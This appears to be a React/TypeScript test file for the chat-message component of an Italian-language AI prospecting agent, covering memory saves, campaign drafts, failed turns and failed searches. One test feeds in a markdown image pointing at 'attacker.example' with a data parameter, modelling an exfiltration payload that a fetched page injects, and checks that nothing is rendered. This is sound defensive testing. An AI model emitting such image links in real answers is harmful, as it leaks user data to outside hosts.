import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vite-plus/test';
import { TestIntl } from '@/app/auth/testing';
import type { UIMessage, UIToolCall } from '@/lib/chat/stream-store-types';
import { ChatMessage } from './chat-message';

const remember = (extra: Partial<UIToolCall>): UIToolCall => ({
  id: 'r1',
  name: 'remember',
  input: {},
  status: 'done',
  ...extra,
});

const message = (extra: Partial<UIMessage>): UIMessage => ({
  id: 'm',
  role: 'assistant',
  content: '',
  toolCalls: [],
  parts: [],
  createdAt: new Date(0),
  ...extra,
});

function render(msg: UIMessage) {
  const withParts = {
    ...msg,
    parts: msg.toolCalls.map((c) => ({ kind: 'tool' as const, id: c.id, toolCallId: c.id })),
  };
  return renderToStaticMarkup(
    <TestIntl>
      <ChatMessage message={withParts} streaming={false} credits={null} companyRows={null} />
    </TestIntl>,
  );
}

const ask = { question: 'Email?', options: [{ label: 'Sì', description: null }] };
const plan = {
  question: '',
  options: [],
  plan: {
    listId: 'L',
    version: 1,
    mode: 'build' as const,
    entity: 'company' as const,
    targetRows: 50,
    columns: [],
    stages: [],
    creditsFixed: 0,
    creditsPerRow: 1,
    estimatedCredits: 50,
    largeRunCredits: 1000,
  },
};

describe('ChatMessage memory', () => {
  // Plan, plain question and funnel each render in their own branch: the note must sit outside all of them.
  it.each([
    ['no question', undefined],
    ['a question', ask],
    ['a plan', plan],
  ])('shows what remember saved on a turn with %s', (_, question) => {
    const html = render(
      message({
        toolCalls: [remember({ memorySaved: 'Vende HR' })],
        ...(question && { question }),
      }),
    );
    expect(html).toContain('Vende HR');
  });

  it('shows what remember saved when the turn ends on the no-results funnel', () => {
    const funnel = {
      steps: [{ group: 'where' as const, values: ['Torino'], count: 0 }],
      excludedIndex: 0,
      entity: 'company' as const,
    };
    const html = render(
      message({
        toolCalls: [remember({ memorySaved: 'Vende HR' })],
        question: { question: 'q', options: [], funnel },
      }),
    );
    expect(html).toContain('Vende HR');
    expect(html).toContain('Nessuna azienda rispetta tutti i filtri');
  });

  it('shows a failed remember as a failed step, even on a question turn', () => {
    const html = render(message({ toolCalls: [remember({ status: 'error' })], question: ask }));
    expect(html).toContain('Memoria aggiornata');
    expect(html).toContain('Errore');
  });

  it('shows a draft_campaign call as the campaign card, and a failed one as a tool row', () => {
    const html = render(
      message({
        toolCalls: [
          {
            id: 'd1',
            name: 'draft_campaign',
            input: { name: 'CEO Milano' },
            status: 'done',
            campaign: { id: 'c1', name: 'CEO Milano', targetCount: 47 },
          },
        ],
      }),
    );
    expect(html).toContain('href="/campaigns/c1"');
    expect(html).toContain('Bozza campagna pronta');
    expect(html).toContain('CEO Milano · 47 persone');
    expect(html).not.toContain('Bozza campagna<');

    const failed = render(
      message({
        toolCalls: [{ id: 'd2', name: 'draft_campaign', input: {}, status: 'error' }],
      }),
    );
    expect(failed).toContain('Bozza campagna');
    expect(failed).not.toContain('/campaigns/');
  });
});

describe('ChatMessage failed turn', () => {
  it('says what happened, that nothing was charged and what to do', () => {
    const html = render(message({ status: 'failed', turnFailed: true }));
    expect(html).toContain('role="alert"');
    expect(html).toContain('Non sono riuscito a completare questa richiesta.');
    expect(html).toContain('Non ti è stato addebitato nulla.');
    expect(html).toContain('Invia di nuovo il messaggio per riprovare.');
  });

  it('names the credits a failed turn still cost', () => {
    const html = render(message({ status: 'failed', turnFailed: true, creditsUsed: 12 }));
    expect(html).toContain('Ti è costata 12 crediti');
  });

  it('leaves the failed step to explain a turn that broke on a step', () => {
    const stage = { tool: 'enrich_email', label: 'Ricerca email', units: 10, done: 4 };
    const progress = {
      stages: [{ ...stage, error: { code: 'provider' as const } }],
      phase: null,
      creditsSpent: 0,
      retryStage: null,
      listId: null,
    };
    const html = renderToStaticMarkup(
      <TestIntl>
        <ChatMessage
          message={message({ status: 'failed', turnFailed: true })}
          streaming={false}
          credits={null}
          companyRows={null}
          steps={{ progress, running: false, credits: 0 }}
        />
      </TestIntl>,
    );
    expect(html).toContain('Ricerca email');
    expect(html).not.toContain('Non sono riuscito a completare questa richiesta.');
  });

  it('leaves a refused request and a finished turn without the notice', () => {
    expect(render(message({ status: 'failed' }))).not.toContain('role="alert"');
    expect(render(message({ status: 'success' }))).not.toContain('role="alert"');
  });
});

describe('ChatMessage answer markdown', () => {
  it('loads nothing from a markdown image a fetched page put in the answer', () => {
    const content = 'Done. ![x](https://attacker.example/p?d=1)';
    const html = renderToStaticMarkup(
      <TestIntl>
        <ChatMessage
          message={message({ content, parts: [{ kind: 'text', id: 't', content }] })}
          streaming={false}
          credits={null}
          companyRows={null}
        />
      </TestIntl>,
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('rel="preload"');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('Done.');
  });
});

describe('ChatMessage when every search failed (#735)', () => {
  const failed = (id: string, extra: Partial<UIToolCall> = {}): UIToolCall => ({
    id,
    name: 'web_search',
    input: {},
    status: 'error',
    ...extra,
  });

  it('says it once and folds the failed rows into a closed details block', () => {
    const html = render(message({ toolCalls: [failed('a'), failed('b')], creditsUsed: 0 }));
    expect(html.match(/non hai usato crediti/g)).toHaveLength(1);
    expect(html).toContain('<details');
  });

  it('shows no second alert when the turn also failed', () => {
    const html = render(message({ toolCalls: [failed('a')], turnFailed: true, creditsUsed: 0 }));
    expect(html.match(/role="alert"/g)).toHaveLength(1);
  });

  it('keeps the rows when a step delivered', () => {
    const ok = { ...failed('c'), status: 'done' as const };
    expect(render(message({ toolCalls: [failed('a'), ok] }))).not.toContain('<details');
  });

  it('keeps the rows when the failure is a refusal', () => {
    const html = render(message({ toolCalls: [failed('a', { errorCode: 'no_credits' })] }));
    expect(html).not.toContain('<details');
  });

  it('names the agent when the notice is the whole answer (demo QA chat-2)', () => {
    expect(render(message({ toolCalls: [failed('a')], creditsUsed: 0 }))).toContain('Agente');
  });

  it('keeps what the agent adds below the notice (demo QA chat-2)', () => {
    const msg = message({
      toolCalls: [failed('a')],
      parts: [
        { kind: 'tool', id: 'a', toolCallId: 'a' },
        { kind: 'text', id: 't', content: 'Posso partire da un elenco di aziende lombarde.' },
      ],
      creditsUsed: 0,
    });
    const html = renderToStaticMarkup(
      <TestIntl>
        <ChatMessage message={msg} streaming={false} credits={null} companyRows={null} />
      </TestIntl>,
    );
    expect(html.match(/non hai usato crediti/g)).toHaveLength(1);
    expect(html).toContain('Posso partire da un elenco di aziende lombarde.');
  });
});
